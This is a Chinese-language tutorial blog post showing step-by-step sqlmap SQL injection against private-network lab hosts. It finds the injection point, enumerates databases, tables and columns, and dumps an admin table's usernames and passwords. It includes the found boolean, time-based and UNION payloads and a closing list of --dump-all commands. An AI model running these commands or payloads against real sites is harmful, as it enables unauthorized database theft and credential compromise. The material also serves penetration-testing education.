---
title: sqlmap 使用实例
date: 2020-11-21
author: LM
---

## 1.第一步：查找注入点

输入：`sqlmap -u '192.168.3.59/article.php?id=1'`。

输出：出现`Parameter: id (GET)`等内容，存在注入点。

```
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.1.11#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 11:30:43

[11:30:43] [INFO] resuming back-end DBMS 'mysql' 
[11:30:43] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 1817=1817

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: id=1 AND SLEEP(5)

    Type: UNION query
    Title: Generic UNION query (NULL) - 2 columns
    Payload: id=-2184 UNION ALL SELECT NULL,CONCAT(0x716b707071,0x517964767671746351415543654b4b794171664b78754b57434b70774c6b56434b6a46786a4d5a76,0x717a706271)-- BgjA
---
[11:30:43] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[11:30:43] [INFO] fetched data logged to text files under '/root/.sqlmap/output/192.168.3.59'

[*] shutting down at 11:30:43
```

## 2.第二步：查找数据库

输入：`sqlmap -u '192.168.3.59/article.php?id=1' --dbs'`。

输出：注入发现两个数据库`information_schema`和`website`。`information_schema`主要是数据库、表、列的信息，没有什么用处，`website`是网站的数据。

```
........
[11:37:43] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[11:37:43] [INFO] fetching database names
[11:37:43] [INFO] the SQL query used returns 2 entries
[11:37:43] [INFO] retrieved: information_schema
[11:37:43] [INFO] retrieved: website
available databases [2]:                                                       
[*] information_schema
[*] website
......
```

## 3.第三步：注入

输入：`sqlmap -u '192.168.3.59/article.php?id=1' -D website --tables'。`

输出：发现有两张表`admin、articles`。

```
..........
[11:41:14] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[11:41:14] [INFO] fetching tables for database: 'website'
[11:41:14] [INFO] the SQL query used returns 2 entries
[11:41:14] [INFO] retrieved: admin
[11:41:14] [INFO] retrieved: articles
Database: website                                                              
[2 tables]
+----------+
| admin    |
| articles |
+----------+
..........
```

## 4.第四步：读取数据

输入：`sqlmap -u '192.168.3.59/article.php?id=1' -D website -T admin --columns`。

输出：注入得到了三列`user、id、pass`。

```
..............
[11:43:46] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[11:43:46] [INFO] fetching columns for table 'admin' in database 'website'
[11:43:47] [INFO] the SQL query used returns 3 entries
[11:43:47] [INFO] retrieved: "id","int(11)"
[11:43:47] [INFO] retrieved: "user","text"
[11:43:47] [INFO] retrieved: "pass","text"
Database: website                                                              
Table: admin
[3 columns]
+--------+---------+
| Column | Type    |
+--------+---------+
| user   | text    |
| id     | int(11) |
| pass   | text    |
+--------+---------+
............
```

## 5.第五步：查看数据

输入：`sqlmap -u '192.168.3.59/article.php?id=1' -D website -T admin -C user,pass --dump`。

输出：可以查看到用户名与密码。

```
..........
[11:47:33] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.29
back-end DBMS: MySQL >= 5.0.12
[11:47:33] [INFO] fetching entries of column(s) '`user`, pass' for table 'admin' in database 'website'
[11:47:33] [INFO] the SQL query used returns 3 entries
[11:47:33] [INFO] retrieved: "test1","123456"
[11:47:33] [INFO] retrieved: "test2","123456"
[11:47:33] [INFO] retrieved: "test3","123456"
Database: website                                                              
Table: admin
[3 entries]
+--------+--------+
| user   | pass   |
+--------+--------+
| test1  | 123456 |
| test2  | 123456 |
| test3  | 123456 |
+--------+--------+
............
```

## 6.尝试一下

```bash
sqlmap -u "192.168.1.188/vprproject/index.php/Home/Video/index/id/189*" --batch -D test_vprctrl -T adminer --dump

sqlmap -u "192.168.1.188/vprproject/index.php/Home/Video/index/id/189*" --batch -D test_vprctrl -T adminer -columns 

sqlmap -u "192.168.1.188/vprproject/index.php/Home/Video/index/id/189*" --batch -D test_vprctrl --tables

sqlmap -u "192.168.1.188/vprproject/index.php/Home/Video/index/id/189*" --batch -D test_vprctrl --dump-all

sqlmap -u "192.168.1.188/vprproject/index.php/Home/Video/index/id/189*" --batch --dbs

sqlmap -u "192.168.1.188/vprproject/index.php/Home/Video/index/id/189*" --batch
```



